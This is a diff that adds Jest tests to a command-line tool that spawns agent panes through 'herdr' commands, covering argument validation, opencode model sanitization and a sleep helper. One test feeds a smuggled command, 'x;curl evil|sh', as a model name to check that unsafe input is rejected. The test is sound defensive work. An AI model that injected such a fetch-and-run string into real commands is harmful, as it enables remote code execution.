@@ -201,6 +201,11 @@ describe('sendCmd', () => {
     expect(() => h.sendCmd(['jay', 'hi', '--reply'], { run }))
       .toThrow(/cannot resolve sender handle/);
   });
+
+  test('--from without a value throws instead of being silently ignored', () => {
+    const { run } = runner(true);
+    expect(() => h.sendCmd(['jay', 'hi', '--reply', '--from'], { run })).toThrow(/--from needs a value/);
+  });
 });
 
 describe('sendWaitReadCmd', () => {
@@ -275,6 +280,32 @@ describe('agentCmd', () => {
     const { run } = runner();
     expect(() => h.agentCmd(['claude', 'sly', '--workspace', 'wR'], { run }))
       .toThrow(/--workspace and --cwd are required/);
+  });
+
+  test('opencode agent runs the sanitized model argv', () => {
+    const { run, calls } = runner();
+    const out = h.agentCmd(['opencode', 'bob:ollama/qwen2.5:7b', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
+    expect(out).toEqual({ handle: 'bob', model: 'opencode', pane_id: 'wR:p2', tab: 'wR:t2' });
+    expect(calls).toContainEqual(['herdr', 'pane', 'run', 'wR:p2', 'opencode -m ollama/qwen2.5:7b']);
+    expect(calls).toContainEqual(
+      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'bob ⬨', '--no-focus']);
+  });
+
+  test('opencode agent with an unsafe model is rejected before any herdr call', () => {
+    const { run, calls } = runner();
+    expect(() => h.agentCmd(['opencode', 'bob:x;curl evil|sh', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
+      .toThrow(/unsafe characters/);
+    expect(calls).toEqual([]); // makeAgent throws before the preflight list or tab create
+  });
+});
+
+describe('defaultDeps', () => {
+  test('sleep blocks for the requested ms without spawning a subprocess', () => {
+    const deps = h.defaultDeps();
+    expect(typeof deps.sleep).toBe('function');
+    const t0 = Date.now();
+    deps.sleep(15);
+    expect(Date.now() - t0).toBeGreaterThanOrEqual(10);
   });
 });
 
